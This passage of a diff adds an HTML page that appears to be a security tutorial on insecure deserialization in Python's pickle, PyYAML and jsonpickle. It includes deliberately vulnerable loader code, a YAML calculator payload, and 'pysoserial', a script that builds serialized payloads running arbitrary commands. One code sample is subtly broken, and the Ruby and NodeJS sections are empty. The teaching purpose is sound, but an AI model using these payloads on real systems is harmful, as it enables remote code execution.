+                  <span class="o">====</span> <span class="p">)}</span>
+                  <span class="o">====</span> <span class="p">]</span>
+</pre></div>
+
+<p>In order to serialize an arbitrary class, the <code>__reduce__</code> method must be implemented, in a similar way it was for pickle.</p>
+<p>How the exploitation works? Let&rsquo;s consider the following vulnerable code:</p>
+<div class="codehilite"><pre><span class="kn">import</span> <span class="nn">yaml</span>
+
+<span class="c1"># Try to create the desert object from YAML file</span>
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;desert.yml&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">desert_file</span><span class="p">:</span>
+    <span class="k">if</span> <span class="nb">float</span><span class="p">(</span><span class="n">yaml</span><span class="o">.</span><span class="n">__version__</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mf">5.1</span><span class="p">:</span> 
+        <span class="n">desert</span> <span class="o">=</span> <span class="n">yaml</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">desert_file</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">desert</span> <span class="o">=</span> <span class="n">yaml</span><span class="o">.</span><span class="n">unsafe_load</span><span class="p">(</span><span class="n">desert_file</span><span class="p">)</span>
+<span class="c1"># Try printing the desert name</span>
+<span class="k">print</span><span class="p">(</span><span class="n">desert</span><span class="p">[</span><span class="s">&#39;name&#39;</span><span class="p">])</span>
+</pre></div>
+
+<p>You may appreciate the version check before the actual call to <code>load</code>. This was done on purpose because from PyYAML &gt;= 5.1, the <code>load</code> function was patched to avoid &ldquo;function&rdquo; deserialization (e.g. <code>os.system</code>, <code>subprocess.call</code>, <code>subprocess.check_output</code>). However, it may still be possible to exploit it using non function based vectors as <code>subprocess.Popen</code>, as nicely exposed <a href="">here</a>.
+The main concept is the always the same, trick the appliction into loading arbitrary classes/methods. In the case of PyYAML, the following payload can be used to spawn a calculator on the hosting server:</p>
+<div class="codehilite"><pre><span class="kt">!!python/object/apply:nt.system</span>
+<span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">cmd /c calc</span>
+</pre></div>
+
+<p>This simple payload can be created easily using the following code:</p>
+<div class="codehilite"><pre><span class="kn">import</span> <span class="nn">yaml</span><span class="o">,</span> <span class="nn">os</span>
+
+<span class="k">class</span> <span class="nc">Payload</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s">&quot;cmd /c calc.exe&quot;</span><span class="p">,))</span>
+
+<span class="n">yaml</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">Payload</span><span class="p">())</span>
+</pre></div>
+
+<p>Later we&rsquo;ll see how to create custom payloads dynamically.</p>
+<p><strong>JSON</strong></p>
+<p>The same vulnerability we&rsquo;ve already seen in pickle can be applied to jsonpickle. As the name may suggest, the jsonpickle module is actually a json library built on top of pickle. The deserialization issue is located in the <code>decode()</code> function call, as it may be seen in the following vulnerable code snippet:</p>
+<div class="codehilite"><pre><span class="kn">import</span> <span class="nn">jsonpickle</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;payload.json&quot;</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">payload</span><span class="p">:</span>
+    <span class="n">jsonpickle</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+</pre></div>
+
+<p>If we analyse the function call using a tracing function, we&rsquo;ll see that actually the sys module calls the vulnerable function <code>loads</code>. To confirm that, the following snippet may be used:</p>
+<div class="codehilite"><pre><span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">jsonpickle</span>
+<span class="kn">import</span> <span class="nn">re</span>
+
+
+<span class="k">def</span> <span class="nf">trace</span><span class="p">(</span><span class="n">frame</span><span class="p">,</span> <span class="n">event</span><span class="p">,</span> <span class="n">arg</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">event</span> <span class="o">!=</span> <span class="s">&#39;call&#39;</span><span class="p">:</span>
+        <span class="k">return</span>
+    <span class="n">c_object</span> <span class="o">=</span> <span class="n">frame</span><span class="o">.</span><span class="n">f_code</span>
+    <span class="n">func_name</span> <span class="o">=</span> <span class="n">c_object</span><span class="o">.</span><span class="n">co_name</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&quot;load&quot;</span><span class="p">,</span> <span class="n">func_name</span><span class="p">):</span>
+        <span class="k">return</span>
+    <span class="n">func_name_line_no</span> <span class="o">=</span> <span class="n">frame</span><span class="o">.</span><span class="n">f_lineno</span>
+    <span class="n">func_filename</span> <span class="o">=</span> <span class="n">c_object</span><span class="o">.</span><span class="n">co_filename</span>
+    <span class="n">caller</span> <span class="o">=</span> <span class="n">frame</span><span class="o">.</span><span class="n">f_back</span>
+    <span class="n">caller_line_no</span> <span class="o">=</span> <span class="n">caller</span><span class="o">.</span><span class="n">f_lineno</span>
+    <span class="n">caller_filename</span> <span class="o">=</span> <span class="n">caller</span><span class="o">.</span><span class="n">f_code</span><span class="o">.</span><span class="n">co_filename</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">&#39;Call to {0} on line {1} of {2} from line {3} of {4}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">func_name</span><span class="p">,</span> <span class="n">func_name_line_no</span><span class="p">,</span> <span class="n">func_filename</span><span class="p">,</span><span class="n">caller_line_no</span><span class="p">,</span> <span class="n">caller_filename</span><span class="p">))</span>
+
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;payload.json&quot;</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">payload</span><span class="p">:</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">settrace</span><span class="p">(</span><span class="n">trace</span><span class="p">)</span>
+    <span class="n">jsonpickle</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+</pre></div>
+
+<p>Which would produce the following results:</p>
+<div class="codehilite"><pre>$ python tracer.py
+
+Call to loads on line 299 of C:\Users\amagnosi\AppData\Local\Programs\Python\Python37\lib\json\__init__.py from line 207 of C:\Users\amagnosi\PycharmProjects\PayloadGenerator\venv\lib\site-packages\jsonpickle\backend.py
+Call to loadclass on line 600 of C:\Users\amagnosi\PycharmProjects\PayloadGenerator\venv\lib\site-packages\jsonpickle\unpickler.py from line 326 of C:\Users\amagnosi\PycharmProjects\PayloadGenerator\venv\lib\site-
+packages\jsonpickle\unpickler.py
+</pre></div>
+
+<p>As for the previous two modules, the serialization processs uses <code>__reduce__</code> to create the serializaed representation of the object. Generate a working exploit is as easy as it was for PyYAML, and can be done using the following code:</p>
+<div class="codehilite"><pre><span class="kn">import</span> <span class="nn">yaml</span>
+
+<span class="k">class</span> <span class="nc">Payload</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s">&quot;cmd /c calc.exe&quot;</span><span class="p">,))</span>
+
+<span class="n">yaml</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">Payload</span><span class="p">())</span>
+</pre></div>
+
+<p>Ok, that&rsquo;s seems interesting, but still we would like to generate our serialized payloads without rewriting the code anytime we need to issue a different command, right? </p>
+<p><strong>Generating Exploits for pickle, PyYAML, and jsonpickle</strong></p>
+<p>To testing our payloads, and for simplicity, we&rsquo;ll use the following vulnerable code:</p>
+<div class="codehilite"><pre><span class="kn">import</span> <span class="nn">_pickle</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">yaml</span>
+<span class="kn">import</span> <span class="nn">jsonpickle</span>
+
+<span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">&quot;b&quot;</span><span class="p">:</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;payload.bin&quot;</span><span class="p">,</span> <span class="s">&quot;rb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">payload</span><span class="p">:</span>
+        <span class="n">_pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+<span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">&quot;y&quot;</span><span class="p">:</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;payload.yml&quot;</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">payload</span><span class="p">:</span>
+        <span class="k">if</span> <span class="nb">float</span><span class="p">(</span><span class="n">yaml</span><span class="o">.</span><span class="n">__version__</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mf">5.1</span><span class="p">:</span> 
+            <span class="n">yaml</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">yaml</span><span class="o">.</span><span class="n">unsafe_load</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">&quot;j&quot;</span><span class="p">:</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;payload.json&quot;</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">payload</span><span class="p">:</span>
+        <span class="n">jsonpickle</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+</pre></div>
+
+<p>I created the following code, which can be used to generate different payloads for pickle, yaml and jsonpickle:</p>
+<div class="codehilite"><pre><span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">_pickle</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">jsonpickle</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">yaml</span>
+<span class="kn">import</span> <span class="nn">argparse</span>
+
+
+<span class="k">class</span> <span class="nc">Payload</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">commands</span><span class="p">,</span> <span class="n">vector</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">vector</span> <span class="o">=</span> <span class="n">vector</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">commands</span> <span class="o">=</span> <span class="n">commands</span>
+
+    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">vector</span> <span class="o">==</span> <span class="s">&quot;os&quot;</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">commands</span><span class="p">,)</span>
+        <span class="k">elif</span> <span class="bp">self</span><span class="o">.</span><span class="n">vector</span> <span class="o">==</span> <span class="s">&quot;subprocess&quot;</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">,</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">commands</span><span class="p">,)</span>
+
+
+<span class="k">def</span> <span class="nf">print_available_formats</span><span class="p">():</span>
+    <span class="n">available_formats</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">&quot;pickle&quot;</span><span class="p">:</span> <span class="s">&quot;Format for cPickle and _pickle modules&quot;</span><span class="p">,</span>
+        <span class="s">&quot;json&quot;</span><span class="p">:</span> <span class="s">&quot;Format for jsonpickle module&quot;</span><span class="p">,</span>
+        <span class="s">&quot;yaml&quot;</span><span class="p">:</span> <span class="s">&quot;Format for PyYAML module&quot;</span>
+        <span class="p">}</span>
+    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">available_formats</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">&quot;    {k}: {v}&quot;</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span>
+        <span class="n">description</span><span class="o">=</span><span class="s">&#39;pysoserial - A simple serialization payload generator&#39;</span><span class="p">,</span> <span class="n">add_help</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+        <span class="s">&#39;-d&#39;</span><span class="p">,</span> <span class="s">&#39;--debug&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">&#39;store_true&#39;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span>
+        <span class="n">help</span><span class="o">=</span><span class="s">&#39;Enable debug messages&#39;</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+        <span class="s">&#39;-s&#39;</span><span class="p">,</span> <span class="s">&#39;--save&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">&#39;store_true&#39;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span>
+        <span class="n">help</span><span class="o">=</span><span class="s">&#39;Save payload to file&#39;</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+        <span class="s">&#39;-v&#39;</span><span class="p">,</span> <span class="s">&#39;--vector&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">choices</span><span class="o">=</span><span class="p">[</span><span class="s">&quot;os&quot;</span><span class="p">,</span> <span class="s">&quot;subprocess&quot;</span><span class="p">],</span> <span class="n">default</span><span class="o">=</span><span class="s">&quot;os&quot;</span><span class="p">,</span>
+        <span class="n">help</span><span class="o">=</span><span class="s">&#39;Save payload to file&#39;</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+        <span class="s">&#39;-f&#39;</span><span class="p">,</span> <span class="s">&#39;--format&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">choices</span><span class="o">=</span><span class="p">[</span><span class="s">&quot;pickle&quot;</span><span class="p">,</span> <span class="s">&quot;json&quot;</span><span class="p">,</span> <span class="s">&quot;yaml&quot;</span><span class="p">,</span> <span class="s">&quot;#&quot;</span><span class="p">],</span> <span class="n">default</span><span class="o">=</span><span class="s">&quot;#&quot;</span><span class="p">,</span>
+        <span class="n">help</span><span class="o">=</span><span class="s">&#39;Serialization archive format&#39;</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+        <span class="s">&#39;-c&#39;</span><span class="p">,</span> <span class="s">&#39;--command&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">&#39;Command for the payload&#39;</span><span class="p">)</span>
+
+    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+
+    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">format</span> <span class="o">==</span> <span class="s">&quot;#&quot;</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">&quot;[*] The following format are accepted:&quot;</span><span class="p">)</span>
+        <span class="n">print_available_formats</span><span class="p">()</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">command</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">&quot;[-] A command (-c) is required to generate the payload&quot;</span><span class="p">)</span>
+    <span class="n">command</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">command</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">&quot;[+] Generating serialized object for:&quot;</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">&quot;    {command}&quot;</span><span class="p">)</span>
+    <span class="n">cls</span> <span class="o">=</span> <span class="n">Payload</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">vector</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">format</span> <span class="o">==</span> <span class="s">&quot;pickle&quot;</span><span class="p">:</span>
+
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;payload.bin&quot;</span><span class="p">,</span> <span class="s">&quot;wb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">payload</span><span class="p">:</span>
+            <span class="n">payload</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">_pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">cls</span><span class="p">))</span>
+    <span class="k">elif</span> <span class="n">args</span><span class="o">.</span><span class="n">format</span> <span class="o">==</span> <span class="s">&quot;json&quot;</span><span class="p">:</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;payload.json&quot;</span><span class="p">,</span> <span class="s">&quot;w&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">payload</span><span class="p">:</span>
+            <span class="n">payload</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">jsonpickle</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">cls</span><span class="p">))</span>
+    <span class="k">elif</span> <span class="n">args</span><span class="o">.</span><span class="n">format</span> <span class="o">==</span> <span class="s">&quot;yaml&quot;</span><span class="p">:</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;payload.yml&quot;</span><span class="p">,</span> <span class="s">&quot;w&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">payload</span><span class="p">:</span>
+            <span class="n">yaml</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">cls</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</pre></div>
+
+<p>Now that we explained the main ways to explained the main ways to exploit python </p>
+<h4 id="references_1">References<a class="headerlink" href="#references_1" title="Permanent link"></a></h4>
+<ul>
+<li><a href="https://www.exploit-db.com/docs/47655">PyYAML - Exploit-DB</a></li>
+<li><a href="https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/">Exploiting jsonpickle</a></li>
+</ul>
+<h3 id="ruby">Ruby<a class="headerlink" href="#ruby" title="Permanent link"></a></h3>
+<h3 id="nodejs">NodeJS<a class="headerlink" href="#nodejs" title="Permanent link"></a></h3></article></body></html>
